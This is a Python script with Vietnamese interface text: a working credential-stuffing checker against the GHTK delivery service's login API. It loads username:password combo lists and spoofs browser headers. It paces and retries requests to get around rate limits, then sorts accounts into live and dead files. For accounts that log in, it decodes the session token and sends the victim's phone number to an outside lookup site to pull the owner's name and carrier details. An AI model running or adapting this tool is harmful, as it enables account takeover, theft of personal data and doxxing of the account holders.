#!/usr/bin/env python3
"""
GHTK Phone Checker + Phone Lookup - Proxyless
==============================================
- auth/login → decode JWT → phone lookup → full info
- Auto retry rate limit
- Output: die.txt / live.txt / error.txt / other.txt
"""

import asyncio
import aiohttp
import json
import base64
import uuid
import os
import sys
import time
import random
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════
MAX_CONCURRENT = 1  # Reduced from 3 to 1 to avoid rate limits
DELAY_MIN = 3.0     # Increased from 1.0
DELAY_MAX = 5.0     # Increased from 2.5
MAX_RETRY = 3       # Reduced from 5
RETRY_WAIT = 15     # Increased from 10
TIMEOUT = 30        # Increased from 15
INITIAL_DELAY = 2.0 # Added initial delay between starting tasks

HEADERS_GHTK = {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.7",
    "apptype": "Web",
    "origin": "https://khachhang.giaohangtietkiem.vn",
    "referer": "https://khachhang.giaohangtietkiem.vn/",
    "sec-ch-ua": '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "sec-gpc": "1",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
    "x-client-source": "GHTKApp",
}

HEADERS_LOOKUP = {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.5",
    "referer": "https://phonel00kup01.vercel.app/",
    "sec-ch-ua": '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sec-gpc": "1",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36",
}

# ═══════════════════════════════════════════════════════════════
# STATS
# ═══════════════════════════════════════════════════════════════
stats = {"total": 0, "die": 0, "live": 0, "error": 0, "other": 0, "processed": 0, "retries": 0}
lock = asyncio.Lock()
start_time = None
f_die = None
f_live = None
f_error = None
f_other = None
task_counter = 0  # Added to stagger task starts


# ═══════════════════════════════════════════════════════════════
# JWT DECODE
# ═══════════════════════════════════════════════════════════════
def decode_jwt(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += "=" * padding
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


# ═══════════════════════════════════════════════════════════════
# UI
# ═══════════════════════════════════════════════════════════════
def banner():
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║  {Fore.WHITE}██████╗ ██╗  ██╗████████╗██╗  ██╗  {Fore.YELLOW}Phone Check v4.1      {Fore.CYAN}║
║  {Fore.WHITE}██╔════╝ ██║  ██║╚══██╔══╝██║ ██╔╝  {Fore.GREEN}+ Phone Lookup        {Fore.CYAN}║
║  {Fore.WHITE}██║  ███╗███████║   ██║   █████╔╝   {Fore.MAGENTA}━━━━━━━━━━━━━━━━━━━  {Fore.CYAN}║
║  {Fore.WHITE}██║   ██║██╔══██║   ██║   ██╔═██╗   {Fore.WHITE}Rate-Limit Optimized {Fore.CYAN}║
║  {Fore.WHITE}╚██████╔╝██║  ██║   ██║   ██║  ██╗  {Fore.WHITE}Staggered Start      {Fore.CYAN}║
║  {Fore.WHITE} ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝                        {Fore.CYAN}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


def print_stats_bar():
    elapsed = time.time() - start_time
    cpm = int((stats["processed"] / elapsed) * 60) if elapsed > 0 else 0
    bar = (
        f"\r{Fore.WHITE}{Style.BRIGHT}["
        f"{Fore.CYAN}⏱ {elapsed:.0f}s{Fore.WHITE} │ "
        f"{Fore.WHITE}📊 {stats['processed']}/{stats['total']}{Fore.WHITE} │ "
        f"{Fore.GREEN}✅ {stats['live']}{Fore.WHITE} │ "
        f"{Fore.RED}❌ {stats['die']}{Fore.WHITE} │ "
        f"{Fore.YELLOW}⚠ {stats['other']}{Fore.WHITE} │ "
        f"{Fore.MAGENTA}💥 {stats['error']}{Fore.WHITE} │ "
        f"{Fore.BLUE}🔄 {stats['retries']}{Fore.WHITE} │ "
        f"{Fore.CYAN}⚡ {cpm} CPM"
        f"{Fore.WHITE}]{Style.RESET_ALL}    "
    )
    sys.stdout.write(bar)
    sys.stdout.flush()


def print_result(category, username, password, message):
    colors = {
        "die":   (f"{Fore.RED}{Style.BRIGHT}  ❌ Die   ", Fore.RED),
        "live":  (f"{Fore.GREEN}{Style.BRIGHT}  ✅ Live  ", Fore.GREEN),
        "other": (f"{Fore.YELLOW}{Style.BRIGHT}  ⚠ Other ", Fore.YELLOW),
        "error": (f"{Fore.MAGENTA}{Style.BRIGHT}  💥 Error ", Fore.MAGENTA),
        "retry": (f"{Fore.BLUE}{Style.BRIGHT}  🔄 Retry ", Fore.BLUE),
    }
    icon, color = colors.get(category, colors["other"])
    sys.stdout.write(f"\r{' ' * 150}\r")
    print(f"{icon}{Fore.WHITE}→ {color}{username}:{password}{Fore.WHITE} | {color}{message}{Style.RESET_ALL}")
    print_stats_bar()


# ═══════════════════════════════════════════════════════════════
# API: GHTK Login
# ═══════════════════════════════════════════════════════════════
async def api_auth_login(session, username, password):
    url = "https://web.giaohangtietkiem.vn/api/v1/auth/login"
    headers = {**HEADERS_GHTK, "uniqdevice": str(uuid.uuid4())}
    data = aiohttp.FormData()
    data.add_field("username", username)
    data.add_field("password", password)
    data.add_field("new_version", "true")
    async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as resp:
        text = await resp.text()
        try:
            return json.loads(text)
        except:
            return {"success": False, "message": f"Invalid JSON: {text[:200]}"}


# ═══════════════════════════════════════════════════════════════
# API: Phone Lookup
# ═══════════════════════════════════════════════════════════════
async def api_phone_lookup(session, phone):
    url = f"https://phonel00kup01.vercel.app/api/check?phone={phone}&country=VN"
    try:
        async with session.get(url, headers=HEADERS_LOOKUP, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            text = await resp.text()
            try:
                return json.loads(text)
            except:
                return None
    except Exception:
        return None


def parse_lookup(data: dict) -> str:
    """Trích xuất thông tin từ phone lookup response"""
    if not data:
        return "lookup_failed"

    summary = data.get("summary", {})
    if not summary:
        return "no_summary"

    parts = []
    # Owner name
    owner = summary.get("owner_ascii") or summary.get("owner") or ""
    if owner:
        parts.append(f"name={owner}")

    # Carrier
    carrier = summary.get("carrier", "")
    if carrier:
        parts.append(f"carrier={carrier}")

    # Phone type
    ptype = summary.get("phone_type", "")
    if ptype:
        parts.append(f"type={ptype}")

    # Valid
    valid = summary.get("valid")
    if valid is not None:
        parts.append(f"valid={valid}")

    # VTP UID
    vtp_uid = summary.get("uid", "")
    if vtp_uid:
        parts.append(f"vtp_uid={vtp_uid}")

    # UID created
    created = summary.get("uid_created", "")
    if created:
        parts.append(f"created={created}")

    # Viettel status
    vt_status = summary.get("viettel_status", "")
    if vt_status:
        parts.append(f"vt_status={vt_status}")

    # Phone international format
    intl = summary.get("phone_international", "")
    if intl:
        parts.append(f"intl={intl}")

    return " | ".join(parts) if parts else "no_data"


# ═══════════════════════════════════════════════════════════════
# PROCESS (with retry + phone lookup)
# ═══════════════════════════════════════════════════════════════
async def process_combo(sem, session, username, password, task_id):
    global task_counter
    
    # Staggered start - wait based on task ID
    await asyncio.sleep(task_id * INITIAL_DELAY)
    
    async with sem:
        retries = 0

        while retries <= MAX_RETRY:
            try:
                # Random delay between requests
                delay = random.uniform(DELAY_MIN, DELAY_MAX)
                await asyncio.sleep(delay)

                resp = await api_auth_login(session, username, password)
                success = resp.get("success", False)
                message = resp.get("message", "")
                data_resp = resp.get("data", {}) or {}

                # Debug: Print raw response for rate limit detection
                # print(f"\n{Fore.CYAN}DEBUG: {username} -> success={success}, message={message}{Style.RESET_ALL}")

                # ═══ Rate Limited → Retry (enhanced detection) ═══
                is_rate_limited = any(keyword in message.lower() for keyword in [
                    "quá số lượng", "thử lại sau", "rate", "limit", 
                    "too many", "vui lòng", "sau", "chờ"
                ])
                
                # Also check HTTP status indirectly (if message is empty but not success)
                if not success and not message:
                    is_rate_limited = True

                if is_rate_limited:
                    retries += 1
                    if retries <= MAX_RETRY:
                        async with lock:
                            stats["retries"] += 1
                        wait = RETRY_WAIT * retries + random.uniform(0, 5)  # Exponential backoff
                        print_result("retry", username, password, f"Rate limited, chờ {wait:.0f}s... ({retries}/{MAX_RETRY})")
                        await asyncio.sleep(wait)
                        continue
                    else:
                        f_other.write(f"{username}:{password} | Rate limit (hết retry) | {message}\n")
                        f_other.flush()
                        async with lock:
                            stats["other"] += 1
                            stats["processed"] += 1
                        print_result("other", username, password, "Rate limit (hết retry)")
                        return

                # ═══ LIVE → Decode JWT + Phone Lookup ═══
                if success and data_resp.get("token"):
                    token = data_resp["token"]
                    jwt = decode_jwt(token)
                    uid = jwt.get("uid", "")
                    sub = jwt.get("sub", "")
                    phone = jwt.get("phone", "")
                    exp = jwt.get("exp", "")
                    iat = jwt.get("iat", "")
                    i_uid = jwt.get("i_uid", "")

                    # Phone lookup with delay to avoid rate limits
                    lookup_info = "lookup_skipped"
                    if phone:
                        await asyncio.sleep(random.uniform(1.0, 2.0))  # Delay before lookup
                        lookup_data = await api_phone_lookup(session, phone)
                        lookup_info = parse_lookup(lookup_data)

                    jwt_info = f"uid={uid} | sub={sub} | phone={phone} | exp={exp} | iat={iat} | i_uid={i_uid}"
                    full_line = f"{username}:{password} | {jwt_info} | {lookup_info}"

                    f_live.write(full_line + "\n")
                    f_live.flush()
                    async with lock:
                        stats["live"] += 1
                        stats["processed"] += 1
                    print_result("live", username, password, f"{jwt_info} | {lookup_info}")
                    return

                # ═══ DIE ═══
                if not success:
                    msg = message or "Login failed"
                    f_die.write(f"{username}:{password} | {msg}\n")
                    f_die.flush()
                    async with lock:
                        stats["die"] += 1
                        stats["processed"] += 1
                    print_result("die", username, password, msg)
                    return

                # ═══ OTHER ═══
                msg = message or json.dumps(data_resp, ensure_ascii=False)
                f_other.write(f"{username}:{password} | {msg}\n")
                f_other.flush()
                async with lock:
                    stats["other"] += 1
                    stats["processed"] += 1
                print_result("other", username, password, msg)
                return

            except asyncio.TimeoutError:
                retries += 1
                if retries <= MAX_RETRY:
                    async with lock:
                        stats["retries"] += 1
                    wait = RETRY_WAIT * retries
                    print_result("retry", username, password, f"Timeout, retry ({retries}/{MAX_RETRY})")
                    await asyncio.sleep(wait)
                    continue
                f_error.write(f"{username}:{password} | Timeout (hết retry)\n")
                f_error.flush()
                async with lock:
                    stats["error"] += 1
                    stats["processed"] += 1
                print_result("error", username, password, "Timeout (hết retry)")
                return

            except aiohttp.ClientError as e:
                f_error.write(f"{username}:{password} | ClientError: {e}\n")
                f_error.flush()
                async with lock:
                    stats["error"] += 1
                    stats["processed"] += 1
                print_result("error", username, password, str(e))
                return

            except Exception as e:
                f_error.write(f"{username}:{password} | {type(e).__name__}: {e}\n")
                f_error.flush()
                async with lock:
                    stats["error"] += 1
                    stats["processed"] += 1
                print_result("error", username, password, f"{type(e).__name__}: {e}")
                return


# ═══════════════════════════════════════════════════════════════
# LOADER
# ═══════════════════════════════════════════════════════════════
def load_combos(filepath):
    combos = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            sep = ":" if ":" in line else "|" if "|" in line else None
            if sep:
                parts = line.split(sep, 1)
                if len(parts) == 2:
                    combos.append((parts[0].strip(), parts[1].strip()))
    return combos


def choose_file():
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.attributes("-topmost", True)
        fp = filedialog.askopenfilename(
            title="Chọn file combo (user:pass)",
            filetypes=[("Text files", "*.txt"), ("CSV files", "*.csv"), ("All files", "*.*")]
        )
        root.destroy()
        if fp:
            return fp
    except Exception:
        pass
    print(f"{Fore.YELLOW}Nhập đường dẫn file combo: ", end="")
    return input().strip()


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
async def main():
    global f_die, f_live, f_error, f_other, start_time

    banner()

    print(f"{Fore.CYAN}  ⏎  Nhấn Enter để chọn file combo (user:pass)...{Style.RESET_ALL}", end="")
    input()
    filepath = choose_file()

    if not filepath or not os.path.isfile(filepath):
        print(f"{Fore.RED}  [!] File không tồn tại!")
        return

    combos = load_combos(filepath)
    if not combos:
        print(f"{Fore.RED}  [!] Không tìm thấy combo nào!")
        return

    stats["total"] = len(combos)
    os.makedirs("results", exist_ok=True)
    f_die = open("results/die.txt", "w", encoding="utf-8")
    f_live = open("results/live.txt", "w", encoding="utf-8")
    f_error = open("results/error.txt", "w", encoding="utf-8")
    f_other = open("results/other.txt", "w", encoding="utf-8")

    print(f"""
{Fore.WHITE}  ┌───────────────────────────────────────────────┐
  │  {Fore.GREEN}📁 File:      {Fore.WHITE}{os.path.basename(filepath):<30s}│
  │  {Fore.CYAN}📋 Combos:    {Fore.WHITE}{len(combos):<30d}│
  │  {Fore.MAGENTA}⚡ Threads:   {Fore.WHITE}{MAX_CONCURRENT:<30d}│
  │  {Fore.YELLOW}⏱ Delay:     {Fore.WHITE}{DELAY_MIN}-{DELAY_MAX}s{' ' * 24}│
  │  {Fore.BLUE}🔄 Max Retry: {Fore.WHITE}{MAX_RETRY} (exponential backoff){' ' * 5}│
  │  {Fore.GREEN}📞 Lookup:    {Fore.WHITE}phonel00kup01.vercel.app      │
  │  {Fore.CYAN}🔄 Stagger:   {Fore.WHITE}{INITIAL_DELAY}s between starts{' ' * 15}│
  └───────────────────────────────────────────────┘
""")
    print(f"{Fore.CYAN}{'━' * 70}")
    print(f"{Fore.CYAN}  🚀 BẮT ĐẦU - {datetime.now().strftime('%H:%M:%S')} │ Rate-Limit Optimized")
    print(f"{Fore.CYAN}{'━' * 70}\n")

    start_time = time.time()
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT + 5, limit_per_host=MAX_CONCURRENT, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        # Create tasks with staggered start
        tasks = []
        for i, (u, p) in enumerate(combos):
            task = asyncio.create_task(process_combo(sem, session, u, p, i))
            tasks.append(task)
        
        await asyncio.gather(*tasks)

    f_die.close()
    f_live.close()
    f_error.close()
    f_other.close()

    elapsed = time.time() - start_time
    cpm = int((stats["processed"] / elapsed) * 60) if elapsed > 0 else 0

    print(f"\n\n{Fore.CYAN}{'━' * 70}")
    print(f"{Fore.CYAN}  🏁 HOÀN THÀNH - {elapsed:.1f}s │ {cpm} CPM")
    print(f"{Fore.CYAN}{'━' * 70}")
    print(f"""
{Fore.WHITE}  ┌───────────────────────────────────────────────┐
  │  {Fore.WHITE}📊 Total:     {stats['total']:<30d}│
  │  {Fore.GREEN}✅ Live:      {stats['live']:<30d}│
  │  {Fore.RED}❌ Die:       {stats['die']:<30d}│
  │  {Fore.YELLOW}⚠ Other:     {stats['other']:<30d}│
  │  {Fore.MAGENTA}💥 Error:     {stats['error']:<30d}│
  │  {Fore.BLUE}🔄 Retries:   {stats['retries']:<30d}│
  └───────────────────────────────────────────────┘

{Fore.WHITE}  📂 Output:
  {Fore.GREEN}     results/live.txt  {Fore.WHITE}← u:p | jwt_info | phone_lookup
  {Fore.RED}     results/die.txt
  {Fore.YELLOW}     results/other.txt
  {Fore.MAGENTA}     results/error.txt
""")


if __name__ == "__main__":
    asyncio.run(main())